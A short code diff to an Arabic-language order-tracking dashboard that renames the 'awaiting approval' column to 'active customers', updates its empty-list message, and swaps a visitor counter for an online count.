@@ -243,7 +243,7 @@ html,body{height:100%;overflow:hidden;font-family:'Cairo','Segoe UI',sans-serif;
 
   <div class="body">
     <div class="col-a">
-      <div class="col-a-head"><div class="gd"></div> بانتظار الموافقة (<span id="aCnt">0</span>)</div>
+      <div class="col-a-head"><div class="gd"></div> العملاء النشطين (<span id="aCnt">0</span>)</div>
       <div id="aList"></div>
     </div>
     <div class="col-o">
@@ -342,14 +342,14 @@ function renderStats(){
       '<div class="sc-lb">'+c.label+'</div>'+hint+'</div>';
   }).join('');
   document.getElementById('tbV').textContent=orders.length;
-  document.getElementById('tbO').textContent=totalVisitors;
+  document.getElementById('tbO').textContent=onlineCount;
   document.getElementById('aCnt').textContent=active.length;
   document.getElementById('oCnt').textContent=orders.length;
 }
 
 function renderActive(){
   var el=document.getElementById('aList'),list=orders.filter(isActive);
-  if(!list.length){el.innerHTML='<div class="al-empty"><div class="ic">💤</div><p>لا يوجد طلبات تنتظر الموافقة</p></div>';return;}
+  if(!list.length){el.innerHTML='<div class="al-empty"><div class="ic">💤</div><p>لا يوجد عملاء نشطين</p></div>';return;}
   el.innerHTML=list.map(function(o){
     var badge=o.step?stepBadge(o.step):statusBadge(o.status);
     var pay=o.pay||{};
